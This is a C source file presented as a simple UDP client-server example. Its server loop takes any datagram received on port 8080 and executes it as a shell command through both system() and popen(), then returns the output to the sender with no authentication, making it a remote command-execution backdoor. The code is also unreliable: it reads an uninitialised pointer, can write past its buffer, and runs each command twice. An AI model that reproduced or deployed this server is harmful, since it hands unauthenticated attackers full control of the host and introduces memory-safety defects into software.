
// Server side implementation of UDP client-server model
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define PORT     8080
#define MAXLINE 1024

char* concat(const char *s1, const char *s2)
{
    char *result = malloc(strlen(s1) + strlen(s2) + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    strcpy(result, s1);
    strcat(result, s2);
    return result;
}



// Driver code
int main() {
    int sockfd;
    char buffer[MAXLINE];
    int status;
    FILE *fp;
    char path[1035];

    char *res;
    char *hello = "Hello from server";
    struct sockaddr_in servaddr, cliaddr;

    // Creating socket file descriptor
    if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    memset(&cliaddr, 0, sizeof(cliaddr));

    // Filling server information
    servaddr.sin_family    = AF_INET; // IPv4
    servaddr.sin_addr.s_addr = INADDR_ANY;
    servaddr.sin_port = htons(PORT);

    // Bind the socket with the server address
    if ( bind(sockfd, (const struct sockaddr *)&servaddr,
              sizeof(servaddr)) < 0 )
    {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    int len, n;

    len = sizeof(cliaddr);  //len is value/resuslt
  while (1){
    n = recvfrom(sockfd, (char *)buffer, MAXLINE,
                 MSG_WAITALL, ( struct sockaddr *) &cliaddr,
                 &len);
    buffer[n] = '\0';


    printf("Client execute: %s\n", buffer);
    status = system(buffer);

    /* Open the command for reading. */
    fp = popen(buffer, "r");
    if (fp == NULL) {
        printf("Failed to run command\n" );
        exit(1);
    }

    /* Read the output a line at a time - output it */
    while (fgets(path, sizeof(path), fp) != NULL) {
      res = concat(res,path);
    }


    /* close */
    sendto(sockfd, (const char *)res, strlen( (const char *)res ),
           MSG_CONFIRM, (const struct sockaddr *) &cliaddr,
           len);
    printf("Output sent.\n");

    pclose(fp);
  }
    return 0;
}
